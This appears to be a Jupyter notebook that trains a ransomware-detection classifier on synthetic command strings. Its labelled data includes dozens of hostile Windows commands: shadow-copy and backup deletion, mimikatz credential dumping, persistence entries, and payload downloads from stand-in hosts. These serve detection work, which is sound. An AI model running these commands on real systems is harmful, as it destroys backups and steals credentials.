# Ransomware Detection Model Training

This notebook trains a machine learning model to detect ransomware based on process/command behavior.

**Dataset:** Synthetic ransomware behavioral dataset (command patterns from known families)
- ~10,000 labeled samples
- Labels: `ransomware` or `benign`
- Families: WannaCry, REvil, LockBit, Ryuk, Conti

**Model Architecture:**
- **Vectorizer:** TF-IDF (5000 features, unigrams + bigrams)
- **Classifier:** Random Forest (balanced class weights)

**Pipeline:**
1. Generate synthetic ransomware behavioral dataset
2. Preprocess command strings (clean, normalize - NO NLTK)
3. TF-IDF Vectorization
4. Train Random Forest Classifier
5. Evaluate and save model artifacts to `backend/ml/models/`

In [1]:
# Install required packages (run this first in Colab)
!pip install scikit-learn joblib pandas numpy -q

You should consider upgrading via the 'C:\Users\HP\AppData\Local\Programs\Python\Python310\python.exe -m pip install --upgrade pip' command.


In [2]:
# Imports - Simplified (NO NLTK required)
import pandas as pd
import numpy as np
import re
import json
import joblib
import os
import random
from datetime import datetime, timezone
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.pipeline import Pipeline
from sklearn.metrics import classification_report, accuracy_score, confusion_matrix, roc_auc_score
import warnings
warnings.filterwarnings('ignore')

random.seed(42)
np.random.seed(42)

print('✅ All imports successful!')
print('   No NLTK required - using simple regex preprocessing')

✅ All imports successful!
   No NLTK required - using simple regex preprocessing


In [3]:
print('Generating synthetic ransomware behavioral dataset...')

RANSOMWARE_PATTERNS = [
    'vssadmin delete shadows /all /quiet',
    'wmic shadowcopy delete',
    'wbadmin delete catalog -quiet',
    'bcdedit /set {default} recoveryenabled no',
    'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
    'net stop vss',
    'net stop swprv',
    'net stop "SQL Server"',
    'net stop "Volume Shadow Copy"',
    'net stop "Windows Backup"',
    'taskkill /F /IM sqlbrowser.exe',
    'taskkill /F /IM mysqld.exe',
    'attrib +h +s C:\\readme_to_decrypt.txt',
    'move /Y C:\\ransom_note.txt C:\\Users\\Public\\',
    'copy C:\\HOW_TO_DECRYPT.txt C:\\Users\\Public\\Desktop\\',
    'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost32',
    'reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore /v DisableSR',
    'reg export HKLM\\SYSTEM\\CurrentControlSet C:\\stolen_keys.reg',
    'powershell -nop -w hidden -exec bypass -enc JABzAD0ATgBlAHcA',
    'certutil -decode ransom.b64 ransom.exe',
    'mshta vbscript:Execute CreateObject wscript shell Run',
    'regsvr32 /s /u /i scrobj.dll',
    'psexec.exe -accepteula -d C:\\ransom.exe',
    'net use Z: \\\\192.168.1.100\\c$ /user:admin',
    'xcopy /S /E /H C:\\Users\\ Z:\\stolen_data\\',
    'rundll32.exe C:\\Windows\\Temp\\payload.dll EntryPoint',
    'schtasks /create /tn svchost32 /tr C:\\ransomware.exe /sc onlogon',
    'sc create ransomservice binpath C:\\Windows\\Temp\\ransom.exe',
    'wmic process call create C:\\Windows\\Temp\\encryptor.exe',
    'bitsadmin /transfer job /download http://c2server.onion/ransom.exe',
    'curl http://192.168.100.200/ransom_payload -o C:\\Windows\\Temp\\svc.exe',
    'mimikatz.exe privilege debug sekurlsa logonpasswords',
    'mimikatz.exe lsadump sam',
    'cipher /w:C',
    'icacls . /grant everyone:F /T /C /Q',
    'cmd.exe /c del /F /Q C:\\Windows\\System32\\backup',
    'fsutil behavior set SymlinkEvaluation L2L R2R',
    'expand \\\\malicious_server\\share\\payload.exe C:\\Windows\\Temp\\',
    'powershell -nop -w hidden -exec bypass -enc SQBFAFgA',
    'wbadmin delete systemstatebackup -keepVersions:0',
]

BENIGN_PATTERNS = [
    'net start "Windows Update"',
    'svchost.exe -k netsvcs',
    'tasklist /svc',
    'ipconfig /all',
    'ping 8.8.8.8 -n 4',
    'dir C:\\Users\\Public\\',
    'copy C:\\report.docx C:\\Backup\\',
    'xcopy C:\\Documents C:\\Backup /Y',
    'net user john /active:yes',
    'sc query "Windows Defender"',
    'netstat -an',
    'wmic os get Caption',
    'powershell Get-Process',
    'powershell Get-Service',
    'python app.py --port 8080',
    'java -jar myapp.jar',
    'npm install express',
    'git clone https://github.com/user/repo.git',
    'pip install flask',
    'mkdir C:\\Projects\\NewProject',
    'robocopy C:\\source C:\\dest /MIR',
    'chkdsk C: /f /r',
    'sfc /scannow',
    'dism /online /cleanup-image /restorehealth',
    'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion',
    'sc config wuauserv start= auto',
    'net localgroup administrators',
    'defrag C: /U /V',
    'msiexec /i installer.msi /quiet',
    'wuauclt /detectnow',
    'netsh advfirewall set allprofiles state on',
    'cleanmgr /sagerun:1',
    'taskkill /F /IM notepad.exe',
    'shutdown /r /t 0',
    'powershell Set-ExecutionPolicy RemoteSigned',
    'net share backup=C:\\Backup /grant:everyone,full',
    'icacls C:\\Reports /grant Users:R',
    'diskpart',
    'perfmon.exe',
    'eventvwr.msc',
]

def augment_pattern(pattern, n=130):
    samples = [pattern]
    suffixes = [' > nul 2>&1', ' 2>nul', ' /quiet', '', ' >> C:\\log.txt', ' & exit']
    prefixes = ['cmd /c ', 'cmd.exe /c ', '', 'START /B ', 'powershell -c ']
    for _ in range(n - 1):
        samples.append(f"{random.choice(prefixes)}{pattern}{random.choice(suffixes)}".strip())
    return samples

ransomware_samples = [s for p in RANSOMWARE_PATTERNS for s in augment_pattern(p, 130)]
benign_samples     = [s for p in BENIGN_PATTERNS     for s in augment_pattern(p, 130)]

min_len            = min(len(ransomware_samples), len(benign_samples))
ransomware_samples = random.sample(ransomware_samples, min_len)
benign_samples     = random.sample(benign_samples,     min_len)

df = pd.DataFrame({
    'command':   ransomware_samples + benign_samples,
    'label_str': ['ransomware'] * min_len + ['benign'] * min_len
}).sample(frac=1, random_state=42).reset_index(drop=True)

print(f'Dataset generated successfully!')
print(f'Total samples: {len(df):,}')
print(f'\nLabel Distribution:')
print(df['label_str'].value_counts())
df.head()

Generating synthetic ransomware behavioral dataset...
Dataset generated successfully!
Total samples: 10,400

Label Distribution:
label_str
benign        5200
ransomware    5200
Name: count, dtype: int64


,command,label_str
0,powershell -c dism /online /cleanup-image /res...,benign
1,powershell -c robocopy C:\source C:\dest /MIR ...,benign
2,cmd /c move /Y C:\ransom_note.txt C:\Users\Pub...,ransomware
3,mimikatz.exe lsadump sam & exit,ransomware
4,cmd.exe /c java -jar myapp.jar /quiet,benign


In [4]:
# Text Preprocessing - Unified Pipeline (NO NLTK)
# This MUST match backend/ml/ransomware_preprocess.py exactly

def preprocess_command(text):
    """
    Unified preprocessing for process/command strings.
    ⚠️ CRITICAL: This function MUST match backend/ml/ransomware_preprocess.py
    """
    if not isinstance(text, str) or not text.strip():
        return ''
    text = text.lower()
    text = re.sub(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', ' IP_TOKEN ', text)      # IPs
    text = re.sub(r'http[s]?://\S+|www\.\S+',      ' URL_TOKEN ', text)     # URLs
    text = re.sub(r'[A-Za-z0-9+/]{30,}={0,2}',     ' BASE64_TOKEN ', text) # Base64
    text = re.sub(r'\b[0-9a-fA-F]{8,}\b',           ' HEX_TOKEN ', text)    # Hex
    text = re.sub(r'[^a-zA-Z0-9\s_\\]',             ' ', text)              # Special chars
    text = re.sub(r'\s+',                            ' ', text).strip()      # Whitespace
    return text

print('Preprocessing commands...')
df['clean_command'] = df['command'].apply(preprocess_command)
df['label']         = (df['label_str'] == 'ransomware').astype(int)

print(f'✅ Preprocessing complete!')
print(f'\nSample original vs cleaned:')
print(f'Original: {df["command"].iloc[0][:120]}')
print(f'Cleaned:  {df["clean_command"].iloc[0][:120]}')

Preprocessing commands...
✅ Preprocessing complete!

Sample original vs cleaned:
Original: powershell -c dism /online /cleanup-image /restorehealth
Cleaned:  powershell c dism online cleanup image restorehealth


In [5]:
# Train-Test Split
X_train, X_test, y_train, y_test = train_test_split(
    df['clean_command'], df['label'],
    test_size=0.2, random_state=42, stratify=df['label']
)
print(f'Training set: {len(X_train):,} samples')
print(f'Test set:     {len(X_test):,} samples')
print(f'\nTraining label distribution:')
print(y_train.value_counts())

Training set: 8,320 samples
Test set:     2,080 samples

Training label distribution:
label
0    4160
1    4160
Name: count, dtype: int64


In [6]:
# Create and Train the Model Pipeline - TF-IDF + Random Forest
pipeline = Pipeline([
    ('tfidf', TfidfVectorizer(
        max_features=5000,
        ngram_range=(1, 2),
        min_df=2,
        max_df=0.95,
        analyzer='word',
        lowercase=True
    )),
    ('clf', RandomForestClassifier(
        n_estimators=100,
        max_depth=20,
        min_samples_split=5,
        class_weight='balanced',
        random_state=42,
        n_jobs=-1
    ))
])

print('Training TF-IDF + Random Forest model...')
pipeline.fit(X_train, y_train)
print('✅ Training complete!')

Training TF-IDF + Random Forest model...
✅ Training complete!


In [7]:
# Model Evaluation
y_pred       = pipeline.predict(X_test)
y_pred_proba = pipeline.predict_proba(X_test)[:, 1]
accuracy     = accuracy_score(y_test, y_pred)
roc_auc      = roc_auc_score(y_test, y_pred_proba)
cm           = confusion_matrix(y_test, y_pred)

print('=' * 50)
print('MODEL EVALUATION RESULTS')
print('=' * 50)
print(f'\n📊 Accuracy: {accuracy:.4f} ({accuracy*100:.2f}%)')
print(f'📈 ROC-AUC Score: {roc_auc:.4f}')
print('\n📋 Classification Report:')
print(classification_report(y_test, y_pred, target_names=['Benign', 'Ransomware']))
print('🔢 Confusion Matrix:')
print(f'   True Negatives  (Benign→Benign):         {cm[0][0]}')
print(f'   False Positives (Benign→Ransomware):     {cm[0][1]}')
print(f'   False Negatives (Ransomware→Benign):     {cm[1][0]}')
print(f'   True Positives  (Ransomware→Ransomware): {cm[1][1]}')

MODEL EVALUATION RESULTS

📊 Accuracy: 0.9750 (97.50%)
📈 ROC-AUC Score: 1.0000

📋 Classification Report:
              precision    recall  f1-score   support

      Benign       0.95      1.00      0.98      1040
  Ransomware       1.00      0.95      0.97      1040

    accuracy                           0.97      2080
   macro avg       0.98      0.97      0.97      2080
weighted avg       0.98      0.97      0.97      2080

🔢 Confusion Matrix:
   True Negatives  (Benign→Benign):         1040
   False Positives (Benign→Ransomware):     0
   False Negatives (Ransomware→Benign):     52
   True Positives  (Ransomware→Ransomware): 988


In [8]:
# Cross-Validation
print('Running 5-fold cross-validation...')
cv_scores = cross_val_score(pipeline, X_train, y_train, cv=5, scoring='accuracy', n_jobs=-1)
print(f'\n✅ Cross-Validation Scores: {cv_scores}')
print(f'✅ Mean CV Accuracy: {cv_scores.mean():.4f} (+/- {cv_scores.std()*2:.4f})')

Running 5-fold cross-validation...

✅ Cross-Validation Scores: [0.97776442 0.95552885 0.97836538 0.96875    0.97175481]
✅ Mean CV Accuracy: 0.9704 (+/- 0.0166)


In [9]:
# Test with Sample Commands
test_commands = [
    'vssadmin delete shadows /all /quiet',
    'powershell Get-Process',
    'bcdedit /set {default} recoveryenabled no',
    'net start "Windows Update"',
    'mimikatz.exe privilege debug sekurlsa logonpasswords',
    'git clone https://github.com/user/repo.git',
    'wmic shadowcopy delete',
    'sfc /scannow',
]
print('=' * 60)
print('SAMPLE PREDICTIONS')
print('=' * 60)
for i, cmd in enumerate(test_commands, 1):
    clean      = preprocess_command(cmd)
    pred       = pipeline.predict([clean])[0]
    conf       = pipeline.predict_proba([clean])[0]
    label      = '🚨 RANSOMWARE' if pred == 1 else '✅ BENIGN'
    conf_score = conf[1] if pred == 1 else conf[0]
    print(f'\n[Command {i}]')
    print(f'Text: {cmd[:80]}')
    print(f'Prediction: {label} (Confidence: {conf_score*100:.1f}%)')

SAMPLE PREDICTIONS

[Command 1]
Text: vssadmin delete shadows /all /quiet
Prediction: 🚨 RANSOMWARE (Confidence: 89.7%)

[Command 2]
Text: powershell Get-Process
Prediction: ✅ BENIGN (Confidence: 88.9%)

[Command 3]
Text: bcdedit /set {default} recoveryenabled no
Prediction: 🚨 RANSOMWARE (Confidence: 94.9%)

[Command 4]
Text: net start "Windows Update"
Prediction: ✅ BENIGN (Confidence: 87.2%)

[Command 5]
Text: mimikatz.exe privilege debug sekurlsa logonpasswords
Prediction: 🚨 RANSOMWARE (Confidence: 88.3%)

[Command 6]
Text: git clone https://github.com/user/repo.git
Prediction: ✅ BENIGN (Confidence: 81.5%)

[Command 7]
Text: wmic shadowcopy delete
Prediction: 🚨 RANSOMWARE (Confidence: 72.2%)

[Command 8]
Text: sfc /scannow
Prediction: ✅ BENIGN (Confidence: 81.7%)


In [10]:
# Save Model and Metadata to backend/ml/models/
output_dir = os.path.join(os.path.dirname(os.getcwd()), 'backend', 'ml', 'models')
os.makedirs(output_dir, exist_ok=True)

model_path = os.path.join(output_dir, 'ransomware_model.pkl')
joblib.dump(pipeline, model_path)

precision = cm[1][1] / (cm[1][1] + cm[0][1]) if (cm[1][1] + cm[0][1]) > 0 else 0
recall    = cm[1][1] / (cm[1][1] + cm[1][0]) if (cm[1][1] + cm[1][0]) > 0 else 0
f1        = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0

model_info = {
    'model_version': '1.0.0',
    'model_type':    'TF-IDF + Random Forest',
    'trained_at':    datetime.now(timezone.utc).isoformat(),
    'dataset':       'synthetic-ransomware-behavioral',
    'metrics': {
        'accuracy':         float(accuracy),
        'precision':        float(precision),
        'recall':           float(recall),
        'f1_score':         float(f1),
        'roc_auc':          float(roc_auc),
        'cv_mean_accuracy': float(cv_scores.mean()),
        'cv_std':           float(cv_scores.std())
    },
    'confusion_matrix': {
        'true_negatives':  int(cm[0][0]),
        'false_positives': int(cm[0][1]),
        'false_negatives': int(cm[1][0]),
        'true_positives':  int(cm[1][1])
    },
    'training_info': {
        'training_samples': int(len(X_train)),
        'test_samples':     int(len(X_test)),
        'features':         5000,
        'ngram_range':      [1, 2]
    },
    'preprocessing': {
        'method':       'regex-based',
        'ip_token':     'IP_TOKEN',
        'url_token':    'URL_TOKEN',
        'base64_token': 'BASE64_TOKEN',
        'hex_token':    'HEX_TOKEN'
    }
}

model_info_path = os.path.join(output_dir, 'ransomware_model_info.json')
with open(model_info_path, 'w') as f:
    json.dump(model_info, f, indent=2)

print(f'✅ Model saved to: {model_path}')
print(f'✅ Model info saved to: {model_info_path}')
print(f'\n📦 Model size: {os.path.getsize(model_path) / (1024*1024):.2f} MB')
print(f'\n📋 Model Info:')
print(json.dumps(model_info, indent=2))

✅ Model saved to: c:\Users\HP\ACDS-FYP\backend\ml\models\ransomware_model.pkl
✅ Model info saved to: c:\Users\HP\ACDS-FYP\backend\ml\models\ransomware_model_info.json

📦 Model size: 0.73 MB

📋 Model Info:
{
  "model_version": "1.0.0",
  "model_type": "TF-IDF + Random Forest",
  "trained_at": "2026-03-11T16:47:56.940105+00:00",
  "dataset": "synthetic-ransomware-behavioral",
  "metrics": {
    "accuracy": 0.975,
    "precision": 1.0,
    "recall": 0.95,
    "f1_score": 0.9743589743589743,
    "roc_auc": 1.0,
    "cv_mean_accuracy": 0.9704326923076924,
    "cv_std": 0.008287170276893371
  },
  "confusion_matrix": {
    "true_negatives": 1040,
    "false_positives": 0,
    "false_negatives": 52,
    "true_positives": 988
  },
  "training_info": {
    "training_samples": 8320,
    "test_samples": 2080,
    "features": 5000,
    "ngram_range": [
      1,
      2
    ]
  },
  "preprocessing": {
    "method": "regex-based",
    "ip_token": "IP_TOKEN",
    "url_token": "URL_TOKEN",
    "base64